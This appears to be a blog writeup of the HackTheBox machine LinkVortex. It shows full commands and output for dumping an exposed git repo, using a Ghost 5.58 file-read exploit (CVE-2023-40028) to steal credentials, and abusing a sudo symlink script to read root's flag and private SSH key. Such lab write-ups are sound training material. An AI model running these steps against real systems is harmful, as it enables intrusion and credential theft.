---
layout: post
title: "HTB LinkVortex Writeup"
date: 2025-10-08 16:08:58 -0400
categories: hackthebox HTB-easy
tags: hacking CTF HTB HTB-easy linux ghost arbitrary-file-read symlink
---
## Overview
This is an easy Linux machine on [HackTheBox](https://app.hackthebox.com/machines/LinkVortex){:target="_blank"}{:rel="noopener noreferrer"}. Given an IP we want to compromise the machine by creating a `root` shell with full administrator privileges
### Exploit Path
Fuzzing reveals the `dev` subdomain that hosts a `git` repo. Dumping the repository we find **reused admin credentials**. This version of `Ghost CMS` is vulnerable to an **authenticated arbitrary file read** allowing us to read a configuration file. It contains credentials that are **reused over `ssh`,** giving us a foothold onto the system and the `user.txt` flag!

The `bob` user can run a shell script as `root`. Through a symlink chain we have a **privileged arbitrary file read**. We can read the `root.txt` flag and grab `root`'s private `ssh` key to create a full administrator shell!

![htb-linkvortex-pwn](images/HTB-linkvortex/htb-linkvortex-pwn.png)
## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
┌──(kali@kali)-[~/linkvortex.htb]
└─$ rustscan --accessible -a 10.10.10.70 -- -A -sC    
Automatically increasing ulimit value to 5000.
Open 10.10.11.47:22
Open 10.10.11.47:80
Starting Script(s)
Running script "nmap -vvv -p {{port}} {{ip}} -A -sC" on ip 10.10.11.47
Depending on the complexity of the script, results may take some time to appear.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 12:58 EDT
# ...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: BitByBit Hardware
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-server-header: Apache
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/8%OT=22%CT=%CU=44089%PV=Y%DS=2%DC=T%G=N%TM=68E69833
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)
```

There is a web server running `Ghost 5.58` on port `80`
```bash
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: BitByBit Hardware
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-server-header: Apache
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
```

Add the domain to our `/etc/hosts` file
```bash
<MACHINE_IP> linkvortex.htb
```
### Sub Domain
There's another sub domain found through fuzzing
```bash
┌──(kali@kali)-[~/linkvortex.htb]
└─$ wfuzz -c -t 50 -u http://linkvortex.htb -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 20
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                       
=====================================================================

000000019:   200        115 L    255 W      2538 Ch     "dev"
000009532:   400        8 L      27 W       226 Ch      "#www"
000010581:   400        8 L      27 W       226 Ch      "#mail"
000047706:   400        8 L      27 W       226 Ch      "#smtp"
000103135:   400        8 L      27 W       226 Ch      "#pop3"

Total time: 126.1771
Processed Requests: 114442
Filtered Requests: 114437
Requests/sec.: 906.9944
```

Add the `dev` subdomain to our `/etc/hosts` file
```
<MACHINE_IP> linkvortex.htb dev.linkvortex.htb
```
### Website
The `/robots.txt` file reveals a few directories
```
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

`/ghost` will lead to the dashboard login page

![htb-linkvortex-login](images/HTB-linkvortex/htb-linkvortex-login.png)

Reading through the site we see posts written by the `admin` user, a potential username!

![htb-linkvortex-admin-username](images/HTB-linkvortex/htb-linkvortex-admin-username.png)

We know from our scan the server is running `Ghost v5.58` which is vulnerable to an [authenticated arbitrary file read](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028){:target="_blank"}{:rel="noopener noreferrer"}. It needs credentials to work so we'll need to find a password
## user.txt
### Dev Subdomain
Brute forcing directories on the `dev` sub domain reveals a `.git` folder
```bash
┌──(kali@kali)-[~/linkvortex.htb]
└─$ dirsearch -w /usr/share/wordlists/dirb/common.txt -r -f --threads=100 --url=dev.linkvortex.htb --output=dev-dirsearch-ext.txt -e txt,php,html,js,md 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: txt, php, html, js, md | HTTP method: GET | Threads: 100 | Wordlist size: 31784

Output File: dev-dirsearch-ext.txt

Target: http://dev.linkvortex.htb/

[13:15:05] Starting: 
[13:15:06] 200 -   41B  - /.git/HEAD
[13:15:48] 403 -  199B  - /cgi-bin/
Added to the queue: cgi-bin/
[13:16:54] 403 -  199B  - /icons/
Added to the queue: icons/
```

We can copy the repository to our machine by using [git-dumper](https://github.com/arthaud/git-dumper){:target="_blank"}{:rel="noopener noreferrer"}
```bash
┌──(kali@kali)-[~/linkvortex.htb]
└─$ mkdir dev.linkvortex.htb

┌──(kali@kali)-[~/linkvortex.htb]
└─$ git-dumper http://dev.linkvortex.htb ./dev.linkvortex.htb
```

It's a `git` repo so check for updated files
```bash
┌──(kali@kali)-[~/linkvortex.htb/dev.linkvortex.htb]
└─$ git status            
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
	new file:   Dockerfile.ghost
	modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

The `authentication.test.js` file was changed. Let's view the differences
```bash
┌──(kali@kali)-[~/linkvortex.htb/dev.linkvortex.htb]
└─$ git diff --staged      
# ...
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')
```

**A new password** was added! Login to `Ghost CMS` using the portal and username we found earlier
```
admin@linkvortex.htb:OctopiFociPilfer45
```

![htb-linkvortex-admin-dashboard](images/HTB-linkvortex/htb-linkvortex-admin-dashboard.png)

### Authenticated Arbitrary File Read
We know this version of `Ghost CMS` is vulnerable to a [CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028){:target="_blank"}{:rel="noopener noreferrer"}, an **authenticated file read** vulnerability. Clone the repo and change the `GHOST_URL` variable
```bash
GHOST_URL='http://linkvortex.htb'
```

Now we can run the exploit
```bash
┌──(kali@kali)-[~/linkvortex.htb/CVE-2023-40028]
└─$ ./CVE-2023-40028.sh --help
./CVE-2023-40028.sh: illegal option -- -
Usage: ./CVE-2023-40028.sh -u username -p password

┌──(kali@kali)-[~/linkvortex.htb/CVE-2023-40028]
└─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
> We know this is a docker container so `/etc/passwd` won't contain the user we find later
{: .prompt-tip }

In the `dev` repo there's a `Dockerfile` that gives the full path for a configuration file
```bash
┌──(kali@kali)-[~/linkvortex.htb/dev.linkvortex.htb]
└─$ cat Dockerfile.ghost 
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json
# ...
```

Reading the conf file leaks credentials
```bash
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "<PASSWORD_REDACTED>"
        }
      }
    }
}
```

We can **reuse these credentials** over `ssh` to grab the `user.txt` flag!
```bash
┌──(kali@kali)-[~/linkvortex.htb/dev.linkvortex.htb]
└─$ ssh bob@linkvortex.htb 
bob@linkvortex.htbs password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ id  
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@linkvortex:~$ cat user.txt
```

![htb-linkvortex-user-txt](images/HTB-linkvortex/htb-linkvortex-user-txt.png)
## root.txt
Enumerating `bob`'s `sudo` privileges we can run a shell script as `root` and set the `CHECK_CONTENT` environment variable
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

The `clean_symlink.sh` script will let us **read any file as `root`**. Let's dig into the details

The first argument must end in `.png`
```bash
bob@linkvortex:/opt/ghost$ cat clean_symlink.sh 
#!/bin/bash
# ...
LINK=$1
if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
# ...
```

We can't read a link that contains `etc` or `root` in the target directory
```bash
# ...
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
```

If the `CHECK_CONTENT` environment variable is `true` we have a **privileged file read** on the symlink we pass as an argument
```bash
# ...
QUAR_DIR="/var/quarantined"
# ...
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
	# ...
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

We want to read `root.txt` through a symbolic link but this format will fail as the target can't have `root` in its path
```bash
/home/bob/flag_link -> /root/root.txt
```

But if we **proxy** the symbolic link the check will pass
```bash
# flag_link doesn't have root in its path!
/home/bob/proxy_link.png -> /home/bob/flag_link -> /root/root.txt
```

After a bit of headache I learned that `Ubuntu` has some [symlink restrictions](https://wiki.ubuntu.com/Security/Features#Symlink_restrictions){:target="_blank"}{:rel="noopener noreferrer"}. Our symlink chain won't be followed if it's in a world writable directory like `/tmp`! 

We can see that it's enabled with `sysctl` thanks to [this stack overflow post](https://unix.stackexchange.com/questions/336625/symbolic-link-not-working-as-expected-when-changes-user){:target="_blank"}{:rel="noopener noreferrer"}
```bash
bob@linkvortex:~$ sysctl fs.protected_symlinks
fs.protected_symlinks = 1
```

Let's grab the `root.txt` by creating our symlinks in `bob`'s home directory
```bash
bob@linkvortex:~$ ln -s /root/root.txt flag
bob@linkvortex:~$ ln -s $(pwd)/flag proxy.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh proxy.png 
Link found [ proxy.png ] , moving it to quarantine
Content:
```

![htb-linkvortex-root-txt](images/HTB-linkvortex/htb-linkvortex-root-txt.png)
### Root Shell
Similarly we can leak `root`'s private `ssh` key to get a `root` shell
```bash
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa id_rsa
bob@linkvortex:~$ ln -s $(pwd)/id_rsa proxy.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh proxy.png 
Link found [ proxy.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
# ...
```

Copy it to your machine, change the permissions, and login
```bash
┌──(kali@kali)-[~/linkvortex.htb]
└─$ vim id_rsa

┌──(kali@kali)-[~/linkvortex.htb]
└─$ chmod 600 id_rsa 

┌──(kali@kali)-[~/linkvortex.htb]
└─$ ssh -i id_rsa root@linkvortex.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
```

